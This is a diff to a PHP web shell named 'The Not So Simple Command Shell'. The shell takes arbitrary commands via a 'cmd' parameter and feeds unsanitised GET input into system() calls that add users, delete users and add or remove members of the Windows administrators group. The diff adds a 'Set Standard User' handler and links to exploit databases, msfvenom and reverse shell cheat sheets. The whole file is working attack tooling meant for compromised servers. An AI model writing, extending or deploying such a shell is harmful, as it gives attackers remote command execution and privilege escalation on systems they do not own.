@@ -14,6 +14,10 @@
 		<h4 style="">The Not So Simple Command Shell</h4>
 		<form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
 		<button type="submit">Execute</button></form>
+        <p>Quick Links:</p>
+        <a href="https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf" target="_blank">Nmap Cheat Sheet</a>&nbsp;&nbsp;&nbsp;<a href="https://www.exploit-db.com/" target="_blank">ExploitDB</a>&nbsp;&nbsp;&nbsp;
+        <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a>&nbsp;&nbsp;&nbsp;
+        <a href="https://cxsecurity.com/exploit/" target="_blank" target="_blank">CX Security Vulnerability Database</a>&nbsp;&nbsp;&nbsp;<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a><br>
 		<p>File Options</p>
 		<form action="" method="get">
 		<select name="upload">
@@ -43,7 +47,7 @@
 		<form action="" method="get">
 		<input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
 		<br><br>
-		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button> 
+		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button>
 		</form>
 		<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
 		</div>';
@@ -62,7 +66,14 @@
 			echo (system("net localgroup administrators ".$_GET['user']." /add"));
 			echo '</pre>';
 		}
-			
+
+		if (isset($_GET['userStandard'])){
+			if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to revoke admin</p></div>');
+			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
+			echo (system("net localgroup administrators ".$_GET['user']." /del"));
+			echo '</pre>';
+		}
+
 		if (isset($_GET['delUser'])){
 			if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to delete</p></div>');
 			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';    
